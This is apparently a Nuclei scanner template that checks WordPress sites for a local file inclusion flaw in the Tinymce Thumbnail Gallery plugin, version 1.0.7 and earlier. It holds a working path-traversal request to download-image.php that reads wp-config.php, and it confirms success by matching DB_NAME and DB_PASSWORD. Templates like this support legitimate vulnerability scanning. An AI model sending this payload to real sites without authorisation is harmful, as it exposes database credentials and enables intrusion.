http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php'
id: wp-tinymce-lfi
info:
  author: 0x_Akoko
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: Tinymce Thumbnail Gallery 1.0.7 and before are vulnerable to local
    file inclusion via download-image.php.
  metadata:
    max-request: 1
  name: Tinymce Thumbnail Gallery <=1.0.7 - Local File Inclusion
  reference:
  - https://wpscan.com/vulnerability/4a49b023-c1c9-4cc4-a2fd-af5f911bb400
  - http://wordpress.org/extend/plugins/tinymce-thumbnail-gallery/
  severity: high
  tags: wpscan,wordpress,wp-theme,lfi,tinymce,vuln
